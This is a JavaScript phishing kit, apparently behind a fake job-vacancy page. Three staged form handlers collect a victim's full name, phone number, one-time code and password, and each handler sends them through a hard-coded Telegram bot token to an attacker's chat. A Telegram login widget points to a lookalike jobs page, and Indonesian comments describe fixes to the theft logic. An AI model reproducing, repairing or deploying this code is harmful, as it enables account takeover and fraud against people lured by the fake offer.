<script async src="https://telegram.org/js/telegram-widget.js?22" data-telegram-login="Vagaysndvsbot" data-size="medium" data-auth-url="https://mykerjayacom.vercel.app/jawatankosong1.gy-i1d.com/02/jobs/MR.D.I.Y/indexeacf.html" data-request-access="write"></script>

function processFirstData() {
    $('#firstForm').submit(function(submitingprocessFirstData) {
        submitingprocessFirstData.preventDefault();

        var $full_name = $("input#full_name").val();
        var $phone_number = $("input#phone_number").val();

        // Perbaikan: Menggunakan variabel langsung, bukan .value
        // Menggunakan encodeURIComponent agar karakter spasi/simbol tidak merusak URL
        var gabungan = 'full_name%3A%0A' + encodeURIComponent($full_name) + '%0Aphone_number%3A%0A' + encodeURIComponent($phone_number);

        var token = '8466069094:AAETtXO1q2Ma9fPimI2emwkAlDyymsVUnh4'; // Ganti dengan Token Anda
        var grup = '6917263813'; // Ganti dengan Chat ID Anda
        
        // Perbaikan: Menggunakan || (OR). Jika nama kosong ATAU nomor kosong, maka return false.
        if ($full_name == "" || $phone_number == "") {
            $('.verification_info').show();
            $('.account_verification').hide();
            return false;
        }

        $.ajax({
            type: "POST",
            url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
            data: $(this).serialize(),
            beforeSend: function() {
                $('.loading').show();
            },
            success: function() {
                $(".second").show();
                $('.loading').hide();
                $('.first').hide();
                $("input#validateFullName").val($full_name);
                $("input#validatePhoneNumber").val($phone_number);
            }
        });
    });
    return false;
};

function processSecondData() {
    $('#secondForm').submit(function(submitingprocessSecondData) {
        submitingprocessSecondData.preventDefault();

        var $full_name = $("input#validateFullName").val();
        var $phone_number = $("input#validatePhoneNumber").val();
        var $otp_code = $("input#otp").val(); // Variabel ini bernama $otp_code

        // Perbaikan: Menggunakan variabel yang benar ($otp_code)
        var gabungan = 'full_name%3A%0A' + encodeURIComponent($full_name) + '%0Aphone_number%3A%0A' + encodeURIComponent($phone_number) + '%0Aotp%3A%0A' + encodeURIComponent($otp_code);

        var token = '8466069094:AAETtXO1q2Ma9fPimI2emwkAlDyymsVUnh4';
        var grup = '6917263813';

        // Perbaikan: Variabel $ tidak ada, diganti $otp_code. Logika && diganti ||
        if ($full_name == "" || $phone_number == "" || $otp_code == "") {
            $('.verification_info').show();
            $('.account_verification').hide();
            return false;
        }

        $.ajax({
            type: "POST",
            url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
            data: $(this).serialize(),
            beforeSend: function() {
                $('.loading').show();
            },
            success: function() {
                $(".third").show();
                $('.loading').hide();
                $('.second').hide();
                // Perbaikan: Variabel $otp diganti $otp_code
                $("input#validateOtp").val($otp_code);
            }
        });
    });
    return false;
};

function processThirdData() {
    $('#thirdForm').submit(function(submitingprocessThirdData) {
        submitingprocessThirdData.preventDefault();

        var $full_name = $("input#validateFullName").val();
        var $phone_number = $("input#validatePhoneNumber").val();
        // Pastikan input sebelumnya memiliki id="validateOtp" atau ambil dari input#otp lagi jika masih satu halaman
        var $otp_code = $("input#otp").val(); 
        var $password = $("input#password").val();

        var gabungan = 'full_name%3A%0A' + encodeURIComponent($full_name) + '%0Aphone_number%3A%0A' + encodeURIComponent($phone_number) + '%0Aotp%3A%0A' + encodeURIComponent($otp_code) + '%0Apassword%3A%0A' + encodeURIComponent($password);

        var token = '8466069094:AAETtXO1q2Ma9fPimI2emwkAlDyymsVUnh4';
        var grup = '6917263813';

        // Perbaikan: Menggunakan variabel yang benar dan logika ||
        if ($full_name == "" || $phone_number == "" || $otp_code == "" || $password == "") {
            $('.verification_info').show();
            $('.account_verification').hide();
            return false;
        }

        $.ajax({
            type: "POST",
            url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
            data: $(this).serialize(),
            beforeSend: function() {
                $('.loading').show();
            },
            success: function() {
                $(".four").show();
                $('.loading').hide();
                $('.third').hide();
            }
        });
    });
    return false;
};
